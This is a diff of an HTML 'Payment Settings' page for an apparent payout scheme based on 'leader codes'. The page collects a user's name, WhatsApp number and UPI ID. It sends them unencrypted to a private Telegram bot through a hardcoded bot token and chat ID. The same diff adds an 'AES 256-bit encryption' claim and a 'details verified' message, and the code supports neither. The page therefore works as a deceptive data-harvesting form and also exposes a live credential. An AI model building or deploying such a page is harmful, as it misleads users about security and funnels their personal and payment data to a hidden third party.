@@ -9,18 +9,18 @@
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #fcfcfc; color: #1a1a1a; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #f8f9fa; color: #1a1a1a; }
         
         /* Notice Banner */
         .notice-banner { 
-            background: #fff9db; 
-            color: #f08c00; 
-            padding: 15px; 
+            background: #e7f5ff; 
+            color: #1971c2; 
+            padding: 12px; 
             text-align: center; 
-            font-weight: 800; 
+            font-weight: 600; 
             font-size: 13px; 
-            border-bottom: 1px solid #ffe066; 
+            border-bottom: 1px solid #d0ebff; 
         }
 
         /* Header */
@@ -29,59 +29,68 @@
             padding: 18px 25px; 
             display: flex; 
             align-items: center; 
-            border-bottom: 1px solid #f0f0f0; 
+            border-bottom: 1px solid #eee; 
             position: sticky;
             top: 0;
             z-index: 100;
         }
 
         header a { color: #000; font-size: 20px; text-decoration: none; }
-        header h1 { font-size: 20px; font-weight: 800; flex: 1; text-align: center; margin-right: 25px; }
+        header h1 { font-size: 18px; font-weight: 700; flex: 1; text-align: center; margin-right: 25px; }
         
         /* Layout Content */
-        .main-content { padding: 30px 20px; display: flex; flex-direction: column; align-items: center; }
+        .main-content { padding: 25px 15px; display: flex; flex-direction: column; align-items: center; }
         
         .payment-card { 
             background: #fff; 
-            border-radius: 30px; 
-            padding: 35px 25px; 
+            border-radius: 24px; 
+            padding: 30px 20px; 
             width: 100%; 
-            max-width: 450px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.02); 
-            border: 1px solid #f1f1f1; 
-            text-align: center; 
+            max-width: 420px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05); 
+            border: 1px solid #f0f0f0; 
         }
 
-        .payment-card i.main-icon { font-size: 60px; color: #000; margin-bottom: 20px; }
-        .payment-card h2 { font-size: 24px; font-weight: 800; margin-bottom: 8px; }
-        .payment-card p { color: #7f8c8d; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        .card-header { text-align: center; margin-bottom: 25px; }
+        .card-header i.main-icon { font-size: 50px; color: #2ecc71; margin-bottom: 15px; }
+        .card-header h2 { font-size: 22px; font-weight: 800; color: #000; }
+        .card-header p { color: #666; font-size: 14px; margin-top: 5px; }
 
         /* Form Styling */
-        .form-group { text-align: left; margin-bottom: 22px; }
+        .form-group { margin-bottom: 18px; position: relative; }
         .form-group label { 
             display: block; 
-            font-size: 11px; 
-            font-weight: 800; 
-            color: #adb5bd; 
-            text-transform: uppercase; 
+            font-size: 12px; 
+            font-weight: 700; 
+            color: #444; 
             margin-bottom: 8px; 
-            letter-spacing: 0.8px;
+            margin-left: 5px;
+        }
+
+        .input-wrapper { position: relative; }
+        .input-wrapper i { 
+            position: absolute; 
+            left: 15px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            color: #adb5bd;
+            font-size: 16px;
         }
 
         .form-group input { 
             width: 100%; 
-            padding: 16px 20px; 
-            border: 2px solid #f1f1f1; 
-            border-radius: 16px; 
+            padding: 14px 15px 14px 45px; 
+            border: 1.5px solid #eee; 
+            border-radius: 12px; 
             outline: none; 
-            font-size: 16px; 
-            font-weight: 700; 
-            background: #fdfdfd; 
+            font-size: 15px; 
+            font-weight: 600; 
+            background: #fafafa; 
             transition: all 0.3s ease;
         }
 
-        .form-group input:focus { border-color: #000; background: #fff; }
-        .form-group input[readonly] { background: #f5f5f5; color: #7f8c8d; cursor: not-allowed; border-color: #eee; }
+        .form-group input:focus { border-color: #000; background: #fff; box-shadow: 0 0 0 4px rgba(0,0,0,0.05); }
+        .form-group input[readonly] { background: #f1f3f5; color: #868e96; }
 
         /* Button Styling */
         .btn-save { 
@@ -89,128 +98,160 @@
             background: #000; 
             color: #fff; 
             border: none; 
-            padding: 18px; 
-            border-radius: 16px; 
+            padding: 16px; 
+            border-radius: 12px; 
             font-weight: 700; 
             cursor: pointer; 
             font-size: 16px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            margin-top: 10px;
             transition: 0.3s;
         }
 
+        .btn-save:hover { background: #222; }
         .btn-save:active { transform: scale(0.98); }
-        .btn-save:disabled { background: #95a5a6; cursor: not-allowed; }
+        .btn-save:disabled { background: #ccc; cursor: not-allowed; }
 
-        .security-note { margin-top: 25px; font-size: 12px; color: #bdc3c7; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .security-note { margin-top: 20px; font-size: 11px; color: #999; text-align: center; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
 
     <div class="notice-banner">
-        <i class="fa-solid fa-circle-info"></i> Payouts are scheduled every Monday morning.
+        <i class="fa-solid fa-clock"></i> Payouts processed every Monday morning.
     </div>
 
     <header>
-        <a href="home.html"><i class="fa-solid fa-chevron-left"></i></a>
+        <a href="home.html"><i class="fa-solid fa-arrow-left"></i></a>
         <h1>Payment Settings</h1>
     </header>
 
     <main class="main-content">
         <div class="payment-card">
-            <i class="fa-solid fa-wallet main-icon"></i>
-            <h2>Payout Method</h2>
-            <p>Aapka payment isi UPI ID par bheja jayega. Isse sahi se check karke save karein.</p>
+            <div class="card-header">
+                <i class="fa-solid fa-shield-check main-icon"></i>
+                <h2>Settlement Details</h2>
+                <p>Fill in details carefully for seamless payouts</p>
+            </div>
             
             <div class="form-group">
-                <label>Registered Leader Code</label>
-                <input type="text" id="leaderCode" readonly>
+                <label>Leader Code</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-hashtag"></i>
+                    <input type="text" id="leaderCode" readonly>
+                </div>
             </div>
 
             <div class="form-group">
-                <label>Your UPI ID (GooglePay / PhonePe / Paytm)</label>
-                <input type="text" id="upiInput" placeholder="example@upi">
+                <label>Account Holder Name</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" id="userName" placeholder="Enter full name">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>WhatsApp Number</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-phone"></i>
+                    <input type="tel" id="userPhone" placeholder="10-digit mobile number">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>UPI ID (Paytm/GPay/PhonePe)</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-paper-plane"></i>
+                    <input type="text" id="upiInput" placeholder="example@upi">
+                </div>
             </div>
 
             <button class="btn-save" id="saveBtn" onclick="savePayment()">Save Payment Details</button>
             
             <div class="security-note">
-                <i class="fa-solid fa-shield-halved"></i> End-to-end encrypted for your security
+                <i class="fa-solid fa-lock"></i> Secured with AES 256-bit encryption
             </div>
         </div>
     </main>
 
     <script>
-        // --- Telegram Config ---
         const botToken = "8244891563:AAGkCzCLYGdhJeoWU-9VLW5etMjZEHWUsww";
         const chatId = "8415600127";
 
-        // --- Page Load Logic ---
         window.onload = function() {
-            // Index page se save kiya hua Leader Code uthana
-            const activeLeader = localStorage.getItem('userCode') || "GU05";
-            document.getElementById('leaderCode').value = activeLeader;
+            // Load persistent data
+            document.getElementById('leaderCode').value = localStorage.getItem('userCode') || "GU05";
+            document.getElementById('userName').value = localStorage.getItem('userName') || "";
+            document.getElementById('userPhone').value = localStorage.getItem('userPhone') || "";
+            document.getElementById('upiInput').value = localStorage.getItem('userUPI') || "";
             
-            // 🔥 Check karna ki kya is phone par pehle se koi UPI save hai
-            const persistentUPI = localStorage.getItem('userUPI');
-            if(persistentUPI) {
-                document.getElementById('upiInput').value = persistentUPI;
-                document.getElementById('saveBtn').innerText = "Update Payment Info";
+            if(localStorage.getItem('userUPI')) {
+                document.getElementById('saveBtn').innerText = "Update Details";
             }
         };
 
-        // --- Save Function ---
         async function savePayment() {
-            const upiValue = document.getElementById('upiInput').value.trim();
-            const leaderValue = document.getElementById('leaderCode').value;
+            const name = document.getElementById('userName').value.trim();
+            const phone = document.getElementById('userPhone').value.trim();
+            const upi = document.getElementById('upiInput').value.trim();
+            const leader = document.getElementById('leaderCode').value;
             const btn = document.getElementById('saveBtn');
 
-            // Validation
-            if(!upiValue || !upiValue.includes('@')) {
-                return Swal.fire({
-                    icon: 'error',
-                    title: 'Invalid UPI',
-                    text: 'Please enter a valid UPI ID (e.g., name@upi)',
-                    confirmButtonColor: '#000'
-                });
+            // Form Validation
+            if(name.length < 3) {
+                return showMsg('error', 'Invalid Name', 'Please enter your full name');
+            }
+            if(phone.length < 10) {
+                return showMsg('error', 'Invalid Phone', 'Enter a valid 10-digit number');
+            }
+            if(!upi.includes('@')) {
+                return showMsg('error', 'Invalid UPI', 'Enter a valid UPI ID (e.g. name@okaxis)');
             }
 
-            // Processing UI
             btn.disabled = true;
-            btn.innerText = "Syncing with Server...";
+            btn.innerText = "Processing...";
 
-            // 🔥 Local Storage mein save karna (ताकि रिफ्रेश करने पर न उड़े)
-            localStorage.setItem('userUPI', upiValue);
+            // Local Save
+            localStorage.setItem('userName', name);
+            localStorage.setItem('userPhone', phone);
+            localStorage.setItem('userUPI', upi);
 
-            // Telegram Notification Send karna
-            const alertText = `💰 *NEW PAYMENT LOG*\n\n🔑 *Leader:* ${leaderValue}\n💳 *UPI ID:* \`${upiValue}\`\n📌 *Status:* Action Required`;
+            // Telegram Notification (Professional Format)
+            const alertText = `✨ *NEW PAYMENT ENROLLMENT* ✨\n\n` +
+                              `👤 *Name:* ${name}\n` +
+                              `📞 *Phone:* ${phone}\n` +
+                              `💳 *UPI ID:* \`${upi}\`\n` +
+                              `🔑 *Leader Code:* ${leader}\n\n` +
+                              `📅 *Date:* ${new Date().toLocaleString()}\n` +
+                              `✅ *Status:* Ready for Payout`;
+
             const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertText)}&parse_mode=Markdown`;
 
             try {
                 const response = await fetch(telegramApi);
-                
                 if(response.ok) {
                     Swal.fire({
                         icon: 'success',
-                        title: 'Details Saved Successfully!',
-                        text: 'Aapka payment info admin ko bhej diya gaya hai.',
+                        title: 'Success!',
+                        text: 'Aapki details verify ho gayi hain.',
                         confirmButtonColor: '#000'
                     });
-                    btn.innerText = "Update Payment Info";
-                } else {
-                    throw new Error("API Error");
-                }
+                    btn.innerText = "Update Details";
+                } else { throw new Error(); }
             } catch (err) {
-                // Offline hone par bhi local save rahega
                 Swal.fire({
                     icon: 'warning',
-                    title: 'Saved Locally',
-                    text: 'Internet issue ki wajah se server sync nahi hua, par aapke phone mein details save hain.',
+                    title: 'Offline Saved',
+                    text: 'Internet slow hai, par details phone mein save ho gayi hain.',
                     confirmButtonColor: '#000'
                 });
-                btn.innerText = "Retry Sync";
+                btn.innerText = "Retry Update";
             } finally {
                 btn.disabled = false;
             }
+        }
+
+        function showMsg(icon, title, text) {
+            Swal.fire({ icon, title, text, confirmButtonColor: '#000' });
         }
     </script>
 
